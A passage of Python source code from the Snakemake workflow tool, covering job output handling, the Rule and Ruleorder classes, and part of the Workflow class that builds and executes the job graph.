        existing = [f.mtime for f in self.expanded_output if f.exists]
        if self.benchmark and self.benchmark.exists:
            existing.append(self.benchmark.mtime)
        if existing:
            return min(existing)
        return None

    @property
    def input_maxtime(self):
        """ Return newest input file. """
        existing = [f.mtime for f in self.input if f.exists]
        if existing:
            return max(existing)
        return None

    def missing_output(self, requested=None):
        """ Return missing output files. """
        files = set()
        if self.benchmark and (requested is None or
                               self.benchmark in requested):
            if not self.benchmark.exists:
                files.add(self.benchmark)

        for f, f_ in zip(self.output, self.rule.output):
            if requested is None or f in requested:
                if f in self.dynamic_output:
                    if not self.expand_dynamic(
                        f_,
                        restriction=self.wildcards,
                        omit_value=_IOFile.dynamic_fill):
                        files.add("{} (dynamic)".format(f_))
                elif not f.exists:
                    files.add(f)
        return files

    @property
    def existing_output(self):
        return filter(lambda f: f.exists, self.expanded_output)

    def check_protected_output(self):
        protected = list(filter(lambda f: f.protected, self.expanded_output))
        if protected:
            raise ProtectedOutputException(self.rule, protected)

    def prepare(self):
        """
        Prepare execution of job.
        This includes creation of directories and deletion of previously
        created dynamic files.
        """

        self.check_protected_output()

        unexpected_output = self.dag.reason(self).missing_output.intersection(
            self.existing_output)
        if unexpected_output:
            logger.warning(
                "Warning: the following output files of rule {} were not "
                "present when the DAG was created:\n{}".format(
                    self.rule, unexpected_output))

        if self.dynamic_output:
            for f, _ in chain(*map(partial(self.expand_dynamic,
                                           restriction=self.wildcards,
                                           omit_value=_IOFile.dynamic_fill),
                                   self.rule.dynamic_output)):
                os.remove(f)
        for f, f_ in zip(self.output, self.rule.output):
            f.prepare()
        for f in self.log:
            f.prepare()
        if self.benchmark:
            self.benchmark.prepare()

    def cleanup(self):
        """ Cleanup output files. """
        to_remove = [f for f in self.expanded_output if f.exists]
        if to_remove:
            logger.info("Removing output files of failed job {}"
                        " since they might be corrupted:\n{}".format(
                            self, ", ".join(to_remove)))
            for f in to_remove:
                f.remove()

    def format_wildcards(self, string, **variables):
        """ Format a string with variables from the job. """
        _variables = dict()
        _variables.update(self.rule.workflow.globals)
        _variables.update(dict(input=self.input,
                               output=self.output,
                               params=self.params,
                               wildcards=self._format_wildcards,
                               threads=self.threads,
                               resources=self.resources,
                               log=self.log,
                               version=self.rule.version,
                               rule=self.rule.name, ))
        _variables.update(variables)
        try:
            return format(string, **_variables)
        except NameError as ex:
            raise RuleException("NameError: " + str(ex), rule=self.rule)
        except IndexError as ex:
            raise RuleException("IndexError: " + str(ex), rule=self.rule)

    def properties(self, omit_resources="_cores _nodes".split()):
        resources = {
            name: res
            for name, res in self.resources.items()
            if name not in omit_resources
        }
        params = {name: value for name, value in self.params.items()}
        properties = {
            "rule": self.rule.name,
            "local": self.dag.workflow.is_local(self.rule),
            "input": self.input,
            "output": self.output,
            "params": params,
            "threads": self.threads,
            "resources": resources
        }
        return properties

    def json(self):
        return json.dumps(self.properties())

    def __repr__(self):
        return self.rule.name

    def __eq__(self, other):
        if other is None:
            return False
        return self.rule == other.rule and (
            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)

    def __lt__(self, other):
        return self.rule.__lt__(other.rule)

    def __gt__(self, other):
        return self.rule.__gt__(other.rule)

    def __hash__(self):
        return self._hash

    @staticmethod
    def expand_dynamic(pattern, restriction=None, omit_value=None):
        """ Expand dynamic files. """
        return list(listfiles(pattern,
                              restriction=restriction,
                              omit_value=omit_value))


class Reason:
    def __init__(self):
        self.updated_input = set()
        self.updated_input_run = set()
        self.missing_output = set()
        self.incomplete_output = set()
        self.forced = False
        self.noio = False
        self.nooutput = False
        self.derived = True

    def __str__(self):
        s = list()
        if self.forced:
            s.append("Forced execution")
        else:
            if self.noio:
                s.append("Rules with neither input nor "
                         "output files are always executed.")
            elif self.nooutput:
                s.append("Rules with a run or shell declaration but no output "
                         "are always executed.")
            else:
                if self.missing_output:
                    s.append("Missing output files: {}".format(
                        ", ".join(self.missing_output)))
                if self.incomplete_output:
                    s.append("Incomplete output files: {}".format(
                        ", ".join(self.incomplete_output)))
                updated_input = self.updated_input - self.updated_input_run
                if updated_input:
                    s.append("Updated input files: {}".format(
                        ", ".join(updated_input)))
                if self.updated_input_run:
                    s.append("Input files updated by another job: {}".format(
                        ", ".join(self.updated_input_run)))
        s = "; ".join(s)
        return s

    def __bool__(self):
        return bool(self.updated_input or self.missing_output or self.forced or
                    self.updated_input_run or self.noio or self.nooutput)

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import os
import re
import sys
import inspect
import sre_constants
from collections import defaultdict

from snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist
from snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log
from snakemake.io import apply_wildcards, is_flagged, not_iterable
from snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException


class Rule:
    def __init__(self, *args, lineno=None, snakefile=None):
        """
        Create a rule

        Arguments
        name -- the name of the rule
        """
        if len(args) == 2:
            name, workflow = args
            self.name = name
            self.workflow = workflow
            self.docstring = None
            self.message = None
            self._input = InputFiles()
            self._output = OutputFiles()
            self._params = Params()
            self.dependencies = dict()
            self.dynamic_output = set()
            self.dynamic_input = set()
            self.temp_output = set()
            self.protected_output = set()
            self.touch_output = set()
            self.subworkflow_input = dict()
            self.resources = dict(_cores=1, _nodes=1)
            self.priority = 0
            self.version = None
            self._log = Log()
            self._benchmark = None
            self.wildcard_names = set()
            self.lineno = lineno
            self.snakefile = snakefile
            self.run_func = None
            self.shellcmd = None
            self.norun = False
        elif len(args) == 1:
            other = args[0]
            self.name = other.name
            self.workflow = other.workflow
            self.docstring = other.docstring
            self.message = other.message
            self._input = InputFiles(other._input)
            self._output = OutputFiles(other._output)
            self._params = Params(other._params)
            self.dependencies = dict(other.dependencies)
            self.dynamic_output = set(other.dynamic_output)
            self.dynamic_input = set(other.dynamic_input)
            self.temp_output = set(other.temp_output)
            self.protected_output = set(other.protected_output)
            self.touch_output = set(other.touch_output)
            self.subworkflow_input = dict(other.subworkflow_input)
            self.resources = other.resources
            self.priority = other.priority
            self.version = other.version
            self._log = other._log
            self._benchmark = other._benchmark
            self.wildcard_names = set(other.wildcard_names)
            self.lineno = other.lineno
            self.snakefile = other.snakefile
            self.run_func = other.run_func
            self.shellcmd = other.shellcmd
            self.norun = other.norun

    def dynamic_branch(self, wildcards, input=True):
        def get_io(rule):
            return (rule.input, rule.dynamic_input) if input else (
                rule.output, rule.dynamic_output
            )

        io, dynamic_io = get_io(self)

        branch = Rule(self)
        io_, dynamic_io_ = get_io(branch)

        expansion = defaultdict(list)
        for i, f in enumerate(io):
            if f in dynamic_io:
                try:
                    for e in reversed(expand(f, zip, **wildcards)):
                        expansion[i].append(IOFile(e, rule=branch))                    
                except KeyError:
                    return None

        # replace the dynamic files with the expanded files
        replacements = [(i, io[i], e)
                        for i, e in reversed(list(expansion.items()))]
        for i, old, exp in replacements:
            dynamic_io_.remove(old)
            io_.insert_items(i, exp)

        if not input:
            for i, old, exp in replacements:
                if old in branch.temp_output:
                    branch.temp_output.discard(old)
                    branch.temp_output.update(exp)
                if old in branch.protected_output:
                    branch.protected_output.discard(old)
                    branch.protected_output.update(exp)
                if old in branch.touch_output:
                    branch.touch_output.discard(old)
                    branch.touch_output.update(exp)

            branch.wildcard_names.clear()
            non_dynamic_wildcards = dict((name, values[0])
                                         for name, values in wildcards.items()
                                         if len(set(values)) == 1)
            # TODO have a look into how to concretize dependencies here
            (branch._input, branch._output, branch._params, branch._log,
             branch._benchmark, _, branch.dependencies
             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)
            return branch, non_dynamic_wildcards
        return branch

    def has_wildcards(self):
        """
        Return True if rule contains wildcards.
        """
        return bool(self.wildcard_names)

    @property
    def benchmark(self):
        return self._benchmark

    @benchmark.setter
    def benchmark(self, benchmark):
        self._benchmark = IOFile(benchmark, rule=self)

    @property
    def input(self):
        return self._input

    def set_input(self, *input, **kwinput):
        """
        Add a list of input files. Recursive lists are flattened.

        Arguments
        input -- the list of input files
        """
        for item in input:
            self._set_inoutput_item(item)
        for name, item in kwinput.items():
            self._set_inoutput_item(item, name=name)

    @property
    def output(self):
        return self._output

    @property
    def products(self):
        products = list(self.output)
        if self.benchmark:
            products.append(self.benchmark)
        return products

    def set_output(self, *output, **kwoutput):
        """
        Add a list of output files. Recursive lists are flattened.

        Arguments
        output -- the list of output files
        """
        for item in output:
            self._set_inoutput_item(item, output=True)
        for name, item in kwoutput.items():
            self._set_inoutput_item(item, output=True, name=name)

        for item in self.output:
            if self.dynamic_output and item not in self.dynamic_output:
                raise SyntaxError(
                    "A rule with dynamic output may not define any "
                    "non-dynamic output files.")
            wildcards = item.get_wildcard_names()
            if self.wildcard_names:
                if self.wildcard_names != wildcards:
                    raise SyntaxError(
                        "Not all output files of rule {} "
                        "contain the same wildcards.".format(self.name))
            else:
                self.wildcard_names = wildcards

    def _set_inoutput_item(self, item, output=False, name=None):
        """
        Set an item to be input or output.

        Arguments
        item     -- the item
        inoutput -- either a Namedlist of input or output items
        name     -- an optional name for the item
        """
        inoutput = self.output if output else self.input
        if isinstance(item, str):
            # add the rule to the dependencies
            if isinstance(item, _IOFile):
                self.dependencies[item] = item.rule
            _item = IOFile(item, rule=self)
            if is_flagged(item, "temp"):
                if not output:
                    raise SyntaxError("Only output files may be temporary")
                self.temp_output.add(_item)
            if is_flagged(item, "protected"):
                if not output:
                    raise SyntaxError("Only output files may be protected")
                self.protected_output.add(_item)
            if is_flagged(item, "touch"):
                if not output:
                    raise SyntaxError(
                        "Only output files may be marked for touching.")
                self.touch_output.add(_item)
            if is_flagged(item, "dynamic"):
                if output:
                    self.dynamic_output.add(_item)
                else:
                    self.dynamic_input.add(_item)
            if is_flagged(item, "subworkflow"):
                if output:
                    raise SyntaxError(
                        "Only input files may refer to a subworkflow")
                else:
                    # record the workflow this item comes from
                    self.subworkflow_input[_item] = item.flags["subworkflow"]
            inoutput.append(_item)
            if name:
                inoutput.add_name(name)
        elif callable(item):
            if output:
                raise SyntaxError(
                    "Only input files can be specified as functions")
            inoutput.append(item)
            if name:
                inoutput.add_name(name)
        else:
            try:
                start = len(inoutput)
                for i in item:
                    self._set_inoutput_item(i, output=output)
                if name:
                    # if the list was named, make it accessible
                    inoutput.set_name(name, start, end=len(inoutput))
            except TypeError:
                raise SyntaxError(
                    "Input and output files have to be specified as strings or lists of strings.")

    @property
    def params(self):
        return self._params

    def set_params(self, *params, **kwparams):
        for item in params:
            self._set_params_item(item)
        for name, item in kwparams.items():
            self._set_params_item(item, name=name)

    def _set_params_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.params.append(item)
            if name:
                self.params.add_name(name)
        else:
            try:
                start = len(self.params)
                for i in item:
                    self._set_params_item(i)
                if name:
                    self.params.set_name(name, start, end=len(self.params))
            except TypeError:
                raise SyntaxError("Params have to be specified as strings.")

    @property
    def log(self):
        return self._log

    def set_log(self, *logs, **kwlogs):
        for item in logs:
            self._set_log_item(item)
        for name, item in kwlogs.items():
            self._set_log_item(item, name=name)

    def _set_log_item(self, item, name=None):
        if isinstance(item, str) or callable(item):
            self.log.append(IOFile(item,
                                   rule=self)
                            if isinstance(item, str) else item)
            if name:
                self.log.add_name(name)
        else:
            try:
                start = len(self.log)
                for i in item:
                    self._set_log_item(i)
                if name:
                    self.log.set_name(name, start, end=len(self.log))
            except TypeError:
                raise SyntaxError("Log files have to be specified as strings.")

    def expand_wildcards(self, wildcards=None):
        """
        Expand wildcards depending on the requested output
        or given wildcards dict.
        """

        def concretize_iofile(f, wildcards):
            if not isinstance(f, _IOFile):
                return IOFile(f, rule=self)
            else:
                return f.apply_wildcards(wildcards,
                                         fill_missing=f in self.dynamic_input,
                                         fail_dynamic=self.dynamic_output)

        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,
                             concretize=apply_wildcards,
                             ruleio=None):
            for name, item in olditems.allitems():
                start = len(newitems)
                is_iterable = True
                if callable(item):
                    try:
                        item = item(wildcards_obj)
                    except (Exception, BaseException) as e:
                        raise InputFunctionException(e, rule=self)
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        if not isinstance(item_, str):
                            raise RuleException(
                                "Input function did not return str or list of str.",
                                rule=self)
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                else:
                    if not_iterable(item):
                        item = [item]
                        is_iterable = False
                    for item_ in item:
                        concrete = concretize(item_, wildcards)
                        newitems.append(concrete)
                        if ruleio is not None:
                            ruleio[concrete] = item_
                if name:
                    newitems.set_name(
                        name, start,
                        end=len(newitems) if is_iterable else None)

        if wildcards is None:
            wildcards = dict()
        missing_wildcards = self.wildcard_names - set(wildcards.keys())

        if missing_wildcards:
            raise RuleException(
                "Could not resolve wildcards in rule {}:\n{}".format(
                    self.name, "\n".join(self.wildcard_names)),
                lineno=self.lineno,
                snakefile=self.snakefile)

        ruleio = dict()

        try:
            input = InputFiles()
            wildcards_obj = Wildcards(fromdict=wildcards)
            _apply_wildcards(input, self.input, wildcards, wildcards_obj,
                             concretize=concretize_iofile,
                             ruleio=ruleio)

            params = Params()
            _apply_wildcards(params, self.params, wildcards, wildcards_obj)

            output = OutputFiles(o.apply_wildcards(wildcards)
                                 for o in self.output)
            output.take_names(self.output.get_names())

            dependencies = {
                None if f is None else f.apply_wildcards(wildcards): rule
                for f, rule in self.dependencies.items()
            }

            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))

            log = Log()
            _apply_wildcards(log, self.log, wildcards, wildcards_obj,
                             concretize=concretize_iofile)

            benchmark = self.benchmark.apply_wildcards(
                wildcards) if self.benchmark else None
            return input, output, params, log, benchmark, ruleio, dependencies
        except WildcardError as ex:
            # this can only happen if an input contains an unresolved wildcard.
            raise RuleException(
                "Wildcards in input, params, log or benchmark file of rule {} cannot be "
                "determined from output files:\n{}".format(self, str(ex)),
                lineno=self.lineno,
                snakefile=self.snakefile)

    def is_producer(self, requested_output):
        """
        Returns True if this rule is a producer of the requested output.
        """
        try:
            for o in self.products:
                if o.match(requested_output):
                    return True
            return False
        except sre_constants.error as ex:
            raise IOFileException("{} in wildcard statement".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)
        except ValueError as ex:
            raise IOFileException("{}".format(ex),
                                  snakefile=self.snakefile,
                                  lineno=self.lineno)

    def get_wildcards(self, requested_output):
        """
        Update the given wildcard dictionary by matching regular expression
        output files to the requested concrete ones.

        Arguments
        wildcards -- a dictionary of wildcards
        requested_output -- a concrete filepath
        """
        if requested_output is None:
            return dict()
        bestmatchlen = 0
        bestmatch = None

        for o in self.products:
            match = o.match(requested_output)
            if match:
                l = self.get_wildcard_len(match.groupdict())
                if not bestmatch or bestmatchlen > l:
                    bestmatch = match.groupdict()
                    bestmatchlen = l
        return bestmatch

    @staticmethod
    def get_wildcard_len(wildcards):
        """
        Return the length of the given wildcard values.

        Arguments
        wildcards -- a dict of wildcards
        """
        return sum(map(len, wildcards.values()))

    def __lt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp < 0

    def __gt__(self, rule):
        comp = self.workflow._ruleorder.compare(self, rule)
        return comp > 0

    def __str__(self):
        return self.name

    def __hash__(self):
        return self.name.__hash__()

    def __eq__(self, other):
        return self.name == other.name


class Ruleorder:
    def __init__(self):
        self.order = list()

    def add(self, *rulenames):
        """
        Records the order of given rules as rule1 > rule2 > rule3, ...
        """
        self.order.append(list(rulenames))

    def compare(self, rule1, rule2):
        """
        Return whether rule2 has a higher priority than rule1.
        """
        # try the last clause first,
        # i.e. clauses added later overwrite those before.
        for clause in reversed(self.order):
            try:
                i = clause.index(rule1.name)
                j = clause.index(rule2.name)
                # rules with higher priority should have a smaller index
                comp = j - i
                if comp < 0:
                    comp = -1
                elif comp > 0:
                    comp = 1
                return comp
            except ValueError:
                pass

        # if not ruleorder given, prefer rule without wildcards
        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()
        if wildcard_cmp != 0:
            return wildcard_cmp

        return 0

    def __iter__(self):
        return self.order.__iter__()

__author__ = "Johannes Kster"
__copyright__ = "Copyright 2015, Johannes Kster"
__email__ = "koester@jimmy.harvard.edu"
__license__ = "MIT"

import re
import os
import sys
import signal
import json
import urllib
from collections import OrderedDict
from itertools import filterfalse, chain
from functools import partial
from operator import attrgetter

from snakemake.logging import logger, format_resources, format_resource_names
from snakemake.rules import Rule, Ruleorder
from snakemake.exceptions import RuleException, CreateRuleException, \
    UnknownRuleException, NoRulesException, print_exception, WorkflowError
from snakemake.shell import shell
from snakemake.dag import DAG
from snakemake.scheduler import JobScheduler
from snakemake.parser import parse
import snakemake.io
from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch                    
from snakemake.persistence import Persistence
from snakemake.utils import update_config


class Workflow:
    def __init__(self,
                 snakefile=None,
                 snakemakepath=None,
                 jobscript=None,
                 overwrite_shellcmd=None,
                 overwrite_config=dict(),
                 overwrite_workdir=None,
                 overwrite_configfile=None,
                 config_args=None,
                 debug=False):
        """
        Create the controller.
        """
        self._rules = OrderedDict()
        self.first_rule = None
        self._workdir = None
        self.overwrite_workdir = overwrite_workdir
        self.workdir_init = os.path.abspath(os.curdir)
        self._ruleorder = Ruleorder()
        self._localrules = set()
        self.linemaps = dict()
        self.rule_count = 0
        self.basedir = os.path.dirname(snakefile)
        self.snakefile = os.path.abspath(snakefile)
        self.snakemakepath = snakemakepath
        self.included = []
        self.included_stack = []
        self.jobscript = jobscript
        self.persistence = None
        self.global_resources = None
        self.globals = globals()
        self._subworkflows = dict()
        self.overwrite_shellcmd = overwrite_shellcmd
        self.overwrite_config = overwrite_config
        self.overwrite_configfile = overwrite_configfile
        self.config_args = config_args
        self._onsuccess = lambda log: None
        self._onerror = lambda log: None
        self.debug = debug

        global config
        config = dict()
        config.update(self.overwrite_config)

        global rules
        rules = Rules()

    @property
    def subworkflows(self):
        return self._subworkflows.values()

    @property
    def rules(self):
        return self._rules.values()

    @property
    def concrete_files(self):
        return (
            file
            for rule in self.rules for file in chain(rule.input, rule.output)
            if not callable(file) and not file.contains_wildcard()
        )

    def check(self):
        for clause in self._ruleorder:
            for rulename in clause:
                if not self.is_rule(rulename):
                    raise UnknownRuleException(
                        rulename,
                        prefix="Error in ruleorder definition.")

    def add_rule(self, name=None, lineno=None, snakefile=None):
        """
        Add a rule.
        """
        if name is None:
            name = str(len(self._rules) + 1)
        if self.is_rule(name):
            raise CreateRuleException(
                "The name {} is already used by another rule".format(name))
        rule = Rule(name, self, lineno=lineno, snakefile=snakefile)
        self._rules[rule.name] = rule
        self.rule_count += 1
        if not self.first_rule:
            self.first_rule = rule.name
        return name

    def is_rule(self, name):
        """
        Return True if name is the name of a rule.

        Arguments
        name -- a name
        """
        return name in self._rules

    def get_rule(self, name):
        """
        Get rule by name.

        Arguments
        name -- the name of the rule
        """
        if not self._rules:
            raise NoRulesException()
        if not name in self._rules:
            raise UnknownRuleException(name)
        return self._rules[name]

    def list_rules(self, only_targets=False):
        rules = self.rules
        if only_targets:
            rules = filterfalse(Rule.has_wildcards, rules)
        for rule in rules:
            logger.rule_info(name=rule.name, docstring=rule.docstring)

    def list_resources(self):
        for resource in set(
            resource for rule in self.rules for resource in rule.resources):
            if resource not in "_cores _nodes".split():
                logger.info(resource)

    def is_local(self, rule):
        return rule.name in self._localrules or rule.norun

    def execute(self,
                targets=None,
                dryrun=False,
                touch=False,
                cores=1,
                nodes=1,
                local_cores=1,
                forcetargets=False,
                forceall=False,
                forcerun=None,
                prioritytargets=None,
                quiet=False,
                keepgoing=False,
                printshellcmds=False,
                printreason=False,
                printdag=False,
                cluster=None,
                cluster_config=None,
                cluster_sync=None,
                jobname=None,
                immediate_submit=False,
                ignore_ambiguity=False,
                printrulegraph=False,
                printd3dag=False,
                drmaa=None,
                stats=None,
                force_incomplete=False,
                ignore_incomplete=False,
                list_version_changes=False,
                list_code_changes=False,
                list_input_changes=False,
                list_params_changes=False,
                summary=False,
                detailed_summary=False,
                latency_wait=3,
                benchmark_repeats=3,
                wait_for_files=None,
                nolock=False,
                unlock=False,
                resources=None,
                notemp=False,
                nodeps=False,
                cleanup_metadata=None,
                subsnakemake=None,
                updated_files=None,
                keep_target_files=False,
                allowed_rules=None,
                greediness=1.0,
                no_hooks=False):

        self.global_resources = dict() if resources is None else resources
        self.global_resources["_cores"] = cores
        self.global_resources["_nodes"] = nodes

        def rules(items):
            return map(self._rules.__getitem__, filter(self.is_rule, items))

        if keep_target_files:

            def files(items):
                return filterfalse(self.is_rule, items)
        else:

            def files(items):
                return map(os.path.relpath, filterfalse(self.is_rule, items))

        if not targets:
            targets = [self.first_rule
                       ] if self.first_rule is not None else list()
        if prioritytargets is None:
            prioritytargets = list()
        if forcerun is None:
            forcerun = list()

        priorityrules = set(rules(prioritytargets))
        priorityfiles = set(files(prioritytargets))
        forcerules = set(rules(forcerun))
        forcefiles = set(files(forcerun))
        targetrules = set(chain(rules(targets),
                                filterfalse(Rule.has_wildcards, priorityrules),
                                filterfalse(Rule.has_wildcards, forcerules)))
        targetfiles = set(chain(files(targets), priorityfiles, forcefiles))
        if forcetargets:
            forcefiles.update(targetfiles)
            forcerules.update(targetrules)

        rules = self.rules
        if allowed_rules:
            rules = [rule for rule in rules if rule.name in set(allowed_rules)]

        if wait_for_files is not None:
            try:
                snakemake.io.wait_for_files(wait_for_files,
                                            latency_wait=latency_wait)
            except IOError as e:
                logger.error(str(e))
                return False

        dag = DAG(
            self, rules,
            dryrun=dryrun,
            targetfiles=targetfiles,
            targetrules=targetrules,
            forceall=forceall,
            forcefiles=forcefiles,
            forcerules=forcerules,
            priorityfiles=priorityfiles,
            priorityrules=priorityrules,
            ignore_ambiguity=ignore_ambiguity,
            force_incomplete=force_incomplete,
            ignore_incomplete=ignore_incomplete or printdag or printrulegraph,
            notemp=notemp)

        self.persistence = Persistence(
            nolock=nolock,
            dag=dag,
            warn_only=dryrun or printrulegraph or printdag or summary or
            list_version_changes or list_code_changes or list_input_changes or
            list_params_changes)

        if cleanup_metadata:
            for f in cleanup_metadata:
                self.persistence.cleanup_metadata(f)
            return True

        dag.init()
        dag.check_dynamic()

        if unlock:
            try:
                self.persistence.cleanup_locks()
                logger.info("Unlocking working directory.")
                return True
            except IOError:
                logger.error("Error: Unlocking the directory {} failed. Maybe "
                             "you don't have the permissions?")
                return False
        try:
            self.persistence.lock()
        except IOError:
            logger.error(
                "Error: Directory cannot be locked. Please make "
                "sure that no other Snakemake process is trying to create "
                "the same files in the following directory:\n{}\n"
                "If you are sure that no other "
                "instances of snakemake are running on this directory, "
                "the remaining lock was likely caused by a kill signal or "
                "a power loss. It can be removed with "
                "the --unlock argument.".format(os.getcwd()))
            return False

        if self.subworkflows and not printdag and not printrulegraph:
            # backup globals
            globals_backup = dict(self.globals)
            # execute subworkflows
            for subworkflow in self.subworkflows:
                subworkflow_targets = subworkflow.targets(dag)
                updated = list()
                if subworkflow_targets:
                    logger.info(
                        "Executing subworkflow {}.".format(subworkflow.name))
                    if not subsnakemake(subworkflow.snakefile,
                                        workdir=subworkflow.workdir,
                                        targets=subworkflow_targets,
                                        updated_files=updated):
                        return False
                    dag.updated_subworkflow_files.update(subworkflow.target(f)
                                                         for f in updated)
                else:
                    logger.info("Subworkflow {}: Nothing to be done.".format(
                        subworkflow.name))
            if self.subworkflows:
                logger.info("Executing main workflow.")
            # rescue globals
            self.globals.update(globals_backup)

        dag.check_incomplete()
        dag.postprocess()

        if nodeps:
            missing_input = [f for job in dag.targetjobs for f in job.input
                             if dag.needrun(job) and not os.path.exists(f)]
            if missing_input:
                logger.error(
                    "Dependency resolution disabled (--nodeps) "
                    "but missing input "
                    "files detected. If this happens on a cluster, please make sure "
                    "that you handle the dependencies yourself or turn of "
                    "--immediate-submit. Missing input files:\n{}".format(
                        "\n".join(missing_input)))
                return False

        updated_files.extend(f for job in dag.needrun_jobs for f in job.output)

        if printd3dag:
            dag.d3dag()
            return True
        elif printdag:
            print(dag)
            return True
        elif printrulegraph:
            print(dag.rule_dot())
            return True
        elif summary:
            print("\n".join(dag.summary(detailed=False)))
            return True
        elif detailed_summary:
            print("\n".join(dag.summary(detailed=True)))
            return True
        elif list_version_changes:
            items = list(
                chain(*map(self.persistence.version_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_code_changes:
            items = list(chain(*map(self.persistence.code_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_input_changes:
            items = list(chain(*map(self.persistence.input_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True
        elif list_params_changes:
            items = list(
                chain(*map(self.persistence.params_changed, dag.jobs)))
            if items:
                print(*items, sep="\n")
            return True

        scheduler = JobScheduler(self, dag, cores,
                                 local_cores=local_cores,
                                 dryrun=dryrun,
                                 touch=touch,
                                 cluster=cluster,
                                 cluster_config=cluster_config,
                                 cluster_sync=cluster_sync,
                                 jobname=jobname,
                                 immediate_submit=immediate_submit,
                                 quiet=quiet,
                                 keepgoing=keepgoing,
                                 drmaa=drmaa,
                                 printreason=printreason,
                                 printshellcmds=printshellcmds,
                                 latency_wait=latency_wait,
                                 benchmark_repeats=benchmark_repeats,
                                 greediness=greediness)

        if not dryrun and not quiet:
            if len(dag):
                if cluster or cluster_sync or drmaa:
                    logger.resources_info(
                        "Provided cluster nodes: {}".format(nodes))
                else:
                    logger.resources_info("Provided cores: {}".format(cores))
                    logger.resources_info("Rules claiming more threads will be scaled down.")
                provided_resources = format_resources(resources)
                if provided_resources:
                    logger.resources_info(
                        "Provided resources: " + provided_resources)
                ignored_resources = format_resource_names(
                    set(resource for job in dag.needrun_jobs for resource in
                        job.resources_dict if resource not in resources))
                if ignored_resources:
                    logger.resources_info(
                        "Ignored resources: " + ignored_resources)
                logger.run_info("\n".join(dag.stats()))
            else:
                logger.info("Nothing to be done.")
        if dryrun and not len(dag):
            logger.info("Nothing to be done.")

        success = scheduler.schedule()

        if success:
            if dryrun:
                if not quiet and len(dag):
                    logger.run_info("\n".join(dag.stats()))
            elif stats:
                scheduler.stats.to_json(stats)
            if not dryrun and not no_hooks:
                self._onsuccess(logger.get_logfile())
            return True
        else:
            if not dryrun and not no_hooks:
                self._onerror(logger.get_logfile())
            return False

    def include(self, snakefile,
                overwrite_first_rule=False,
                print_compilation=False,
                overwrite_shellcmd=None):
        """
        Include a snakefile.
        """
        # check if snakefile is a path to the filesystem
        if not urllib.parse.urlparse(snakefile).scheme:
            if not os.path.isabs(snakefile) and self.included_stack:
                current_path = os.path.dirname(self.included_stack[-1])
                snakefile = os.path.join(current_path, snakefile)
            snakefile = os.path.abspath(snakefile)
        # else it could be an url.
        # at least we don't want to modify the path for clarity.

        if snakefile in self.included:
            logger.info("Multiple include of {} ignored".format(snakefile))
            return
        self.included.append(snakefile)
        self.included_stack.append(snakefile)

        global workflow

        workflow = self

        first_rule = self.first_rule
        code, linemap = parse(snakefile,
                              overwrite_shellcmd=self.overwrite_shellcmd)

        if print_compilation:
            print(code)

        # insert the current directory into sys.path
        # this allows to import modules from the workflow directory
        sys.path.insert(0, os.path.dirname(snakefile))

        self.linemaps[snakefile] = linemap
        exec(compile(code, snakefile, "exec"), self.globals)
        if not overwrite_first_rule:
            self.first_rule = first_rule
        self.included_stack.pop()

    def onsuccess(self, func):
        self._onsuccess = func

    def onerror(self, func):
        self._onerror = func

    def workdir(self, workdir):
        if self.overwrite_workdir is None:
            if not os.path.exists(workdir):
                os.makedirs(workdir)
            self._workdir = workdir
            os.chdir(workdir)

    def configfile(self, jsonpath):
        """ Update the global config with the given dictionary. """
        global config
        c = snakemake.io.load_configfile(jsonpath)
        update_config(config, c)
        update_config(config, self.overwrite_config)

    def ruleorder(self, *rulenames):
        self._ruleorder.add(*rulenames)

    def subworkflow(self, name, snakefile=None, workdir=None):
        sw = Subworkflow(self, name, snakefile, workdir)
        self._subworkflows[name] = sw
        self.globals[name] = sw.target

    def localrules(self, *rulenames):
        self._localrules.update(rulenames)

    def rule(self, name=None, lineno=None, snakefile=None):
        name = self.add_rule(name, lineno, snakefile)
        rule = self.get_rule(name)

        def decorate(ruleinfo):
            if ruleinfo.input:
                rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1])
            if ruleinfo.output:
                rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1])
            if ruleinfo.params:
                rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1])
            if ruleinfo.threads:
                if not isinstance(ruleinfo.threads, int):
                    raise RuleException("Threads value has to be an integer.",
                                        rule=rule)
                rule.resources["_cores"] = ruleinfo.threads
            if ruleinfo.resources:
                args, resources = ruleinfo.resources
                if args:
                    raise RuleException("Resources have to be named.")
                if not all(map(lambda r: isinstance(r, int),
                               resources.values())):
                    raise RuleException(
                        "Resources values have to be integers.",
                        rule=rule)
                rule.resources.update(resources)
            if ruleinfo.priority:
                if (not isinstance(ruleinfo.priority, int) and
                    not isinstance(ruleinfo.priority, float)):
                    raise RuleException("Priority values have to be numeric.",
                                        rule=rule)
                rule.priority = ruleinfo.priority
            if ruleinfo.version:
                rule.version = ruleinfo.version
            if ruleinfo.log:
                rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1])
            if ruleinfo.message:
                rule.message = ruleinfo.message
            if ruleinfo.benchmark:
                rule.benchmark = ruleinfo.benchmark
            rule.norun = ruleinfo.norun
            rule.docstring = ruleinfo.docstring
            rule.run_func = ruleinfo.func
            rule.shellcmd = ruleinfo.shellcmd
            ruleinfo.func.__name__ = "__{}".format(name)
            self.globals[ruleinfo.func.__name__] = ruleinfo.func
            setattr(rules, name, rule)
